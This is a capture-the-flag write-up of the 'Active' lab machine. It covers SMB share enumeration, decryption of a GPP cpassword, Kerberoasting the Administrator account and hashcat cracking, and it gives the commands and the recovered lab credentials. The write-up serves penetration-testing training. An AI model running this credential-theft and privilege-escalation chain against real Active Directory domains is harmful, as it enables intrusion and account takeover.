#box #gpp-decrypt #nxc #smbclient #hashcat #Kerberoasting 
## Nmap

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 12:16 EDT
Nmap scan report for 10.129.139.164
Host is up (0.046s latency).
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-01 16:16:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-01T16:17:30
|_  start_date: 2025-09-01T16:14:25

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.87 seconds
```

## SMB

After trying RPC and discovering we have no control as anonymous nor access as guest, we proceed with SMB Enumeration.
Within `nxc` we find out that we only have access to a share called `Replication`:

```bash
nxc smb 10.129.139.164 -u '' -p '' --shares

# or

smbclient -N -L //10.129.139.164/ #here we have to enumerate each share until we find one where we have access
```

We access the share, and while at first it seems a non-relevant share, we discover a `Groups.xml` file containing a field called `cpassword` and a domain's user called `SVC_TGS`.
By looking online, we discover that this file is the Group Policy Preferences file, more on that [here](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp).
We discover the existence of a tool called `gpp-decrypt` that takes care of decrypting the password within the AES key in clear shown on Microsoft's [website](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN):

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

This will output us the password of our foothold: `SVC_TGS:GPPstillStandingStrong2k18`

## Privilege Escalation

Without further ado, we proceed to start enumerating what we can now enumerate with a foothold (such as LDAP with `ldapsearch` and we use `bloodhound-python` to dump the AD). While ldapsearch doesn't return us anything important, Bloodhound show us a clear path to gain privilege escalation.
Within Bloodhound, we use the preconfigured queries and we discover that the Administrator is Kerberoastable! Also, we have a Service user, so we have anything necessary to gain control of the DC. 

![[attachments/active-writeup-1.webp]]

We download [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) and we then proceed to [[Kerberoast#^targetedKerberoast|Kerberoast]] the available accounts on the Domain, discovering that the only one is in fact the Administrator.

We now proceed with cracking it with hashcat:

```bash
hashcat -m 13100 admin_tgs.txt /usr/share/wordlists/rockyou.txt
```

Escalating the privileges to DC Administrator:  `Administrator:Ticketmaster1968`